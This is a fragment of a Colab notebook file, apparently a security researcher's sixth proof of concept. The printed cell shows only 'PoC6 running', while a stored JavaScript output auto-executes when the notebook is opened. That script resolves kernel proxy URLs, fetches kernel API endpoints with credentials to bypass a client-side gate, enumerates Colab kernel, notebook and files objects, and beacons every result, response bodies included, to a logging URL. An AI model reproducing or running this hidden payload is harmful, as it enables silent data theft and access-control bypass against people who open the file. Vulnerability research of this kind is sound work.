      "source": [
        "# PoC6 \u2014 Proxy URL Direct Fetch + Deep Kernel Surface\n",
        "Fix for poc5 Test C: actually fetch from resolved proxy URL bypassing FUb.fetchResource.\n",
        "Also probes kernel/output/notebook/files API surfaces."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "poc6_code"
      },
      "source": [
        "print('PoC6 running')"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(async function poc6() {\n  const B = 'https://colab.research.google.com/__poc6';\n  const log = async (tag, val) => {\n    try {\n      await fetch(B + '/' + tag + '?v=' + encodeURIComponent(String(val).slice(0, 500)));\n    } catch(e) {}\n  };\n\n  await log('start', location.host + '|' + Date.now());\n\n  // TEST C (FIXED): proxyPort resolve + actual fetch bypassing FUb.fetchResource\n  try {\n    const proxy = window.google.colab.kernel.proxyPort(8888, {cache: true});\n    if (proxy && typeof proxy.then === 'function') {\n      let resolvedUrl;\n      try {\n        resolvedUrl = String(await proxy);\n        await log('C_resolved', resolvedUrl);\n      } catch(e) { await log('C_resolve_err', e.message); }\n\n      if (resolvedUrl) {\n        // Direct fetch \u2014 bypasses FUb.fetchResource client gate entirely\n        for (const endpoint of ['api/kernels', 'api/', '']) {\n          try {\n            const resp = await fetch(resolvedUrl + endpoint, {credentials: 'include'});\n            await log('C_fetch_' + (endpoint || 'root') + '_status', resp.status);\n            const text = await resp.text();\n            await log('C_fetch_' + (endpoint || 'root') + '_body', text.slice(0, 400));\n          } catch(e) {\n            await log('C_fetch_' + (endpoint || 'root') + '_err', e.name + '|' + e.message);\n          }\n        }\n      }\n    } else if (proxy && proxy.url) {\n      const u = proxy.url.toString();\n      await log('C_url_obj', u);\n      try {\n        const resp = await fetch(u + 'api/kernels', {credentials: 'include'});\n        await log('C_url_fetch_status', resp.status);\n        const text = await resp.text();\n        await log('C_url_fetch_body', text.slice(0, 400));\n      } catch(e) { await log('C_url_fetch_err', e.name + '|' + e.message); }\n    } else {\n      await log('C_proxy_type', typeof proxy + '|val=' + String(proxy));\n    }\n  } catch(e) { await log('C_threw', e.message); }\n\n  // TEST K: deep kernel surface enumeration\n  try {\n    const k = window.google.colab.kernel;\n    const forIn = [];\n    for (const p in k) forIn.push(p);\n    await log('K_for_in', forIn.join(',') || 'empty');\n    await log('K_own', Object.getOwnPropertyNames(k).join(',') || 'empty');\n    const proto = Object.getPrototypeOf(k);\n    await log('K_proto', proto ? Object.getOwnPropertyNames(proto).join(',') : 'null');\n    await log('K_accessAllowed', String(k.accessAllowed));\n    await log('K_invoke_type', typeof k.invoke);\n    await log('K_proxyPort_type', typeof k.proxyPort);\n    // Try proxyPort on other common Jupyter ports\n    for (const port of [8080, 8000, 9000]) {\n      try {\n        const p2 = window.google.colab.kernel.proxyPort(port, {cache: true});\n        if (p2 && typeof p2.then === 'function') {\n          const u2 = String(await p2);\n          await log('K_port_' + port, u2);\n        } else {\n          await log('K_port_' + port, typeof p2);\n        }\n      } catch(e) { await log('K_port_' + port + '_err', e.message); }\n    }\n  } catch(e) { await log('K_threw', e.message); }\n\n  // TEST O: output object surface\n  try {\n    const o = window.google.colab.output;\n    await log('O_own', Object.getOwnPropertyNames(o).join(',') || 'empty');\n    const proto = Object.getPrototypeOf(o);\n    await log('O_proto', proto ? Object.getOwnPropertyNames(proto).join(',') : 'null');\n  } catch(e) { await log('O_threw', e.message); }\n\n  // TEST NB: notebook object surface + isCloudEmbedded check\n  try {\n    const nb = window.google.colab.notebook;\n    await log('NB_own', Object.getOwnPropertyNames(nb).join(',') || 'empty');\n    const proto = Object.getPrototypeOf(nb);\n    await log('NB_proto', proto ? Object.getOwnPropertyNames(proto).join(',') : 'null');\n    // Check isCloudEmbedded \u2014 from checkpoint: window_open has no access check when true\n    await log('NB_isCloudEmbedded', String(nb.isCloudEmbedded || window.isCloudEmbedded || 'not_found'));\n  } catch(e) { await log('NB_threw', e.message); }\n\n  // TEST FILES: files object surface (uploads \u2014 potential SSRF/exfil primitive)\n  try {\n    const f = window.google.colab.files;\n    await log('FILES_own', Object.getOwnPropertyNames(f).join(',') || 'empty');\n    const proto = Object.getPrototypeOf(f);\n    await log('FILES_proto', proto ? Object.getOwnPropertyNames(proto).join(',') : 'null');\n  } catch(e) { await log('FILES_threw', e.message); }\n\n  // TEST OPEN: openUrl surface \u2014 already threw in poc5, but probe it more\n  try {\n    const ou = window.google.colab.openUrl;\n    await log('OPEN_type', typeof ou);\n    // Don't call it \u2014 just check proto\n    const proto = Object.getPrototypeOf(ou);\n    await log('OPEN_proto', proto ? Object.getOwnPropertyNames(proto).join(',') : 'null');\n  } catch(e) { await log('OPEN_threw', e.message); }\n\n  await log('done', Date.now());\n})();\n",
            "text/plain": [
              "<poc6_autoexec>"
            ]
          },
          "metadata": {}
        }
      ],
      "execution_count": 1
    }
  ]
